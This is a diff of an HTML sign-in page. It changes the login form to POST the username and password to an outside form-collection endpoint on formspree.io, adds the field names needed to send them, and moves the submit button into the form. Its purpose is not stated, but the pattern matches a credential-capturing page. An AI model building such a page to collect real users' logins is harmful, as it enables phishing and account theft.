@@ -20,13 +20,13 @@
                 <main>
                     <div class="loginMenu">
                         <h1>Sign in</h1>
-                        <form action="#" method="get">
+                        <form action="https://formspree.io/f/xrgvwzaq" method="post">
                             <div class="signIn">
                                 <label for="login">  
-                                    <input type="text" placeholder="USERNAME" id="login">
+                                    <input type="text" placeholder="USERNAME" id="login" name="login">
                                 </label>
                                 <label for="password">
-                                    <input type="password" placeholder="PASSWORD" id="password">
+                                    <input type="password" placeholder="PASSWORD" id="password" name="password">
                                 </label>
                             </div>
                             <div class="loginMethod">
@@ -39,15 +39,16 @@
                                 <input type="checkbox" id="check">
                                 <label for="check"><span>Stay signed in</span></label>
                             </div>
+                            <div class="loginArrow">
+                                <button type="submit"><i class="fa-solid fa-arrow-right"></i></button>
+                            </div>
                         </form>
                     </div>
                 </main>
             </div>
             <footer>
                 <div class="footer">
-                    <div class="loginArrow">
-                        <button type="submit"><i class="fa-solid fa-arrow-right"></i></button>
-                    </div>
+                    
                     <span><a href="#">CAN'T SIGN IN ?</a></span>
                     <span><a href="#">CREAT ACCOUNT</a></span> 
                     <span class="version"><a href="#">V669.0.3</a></span>
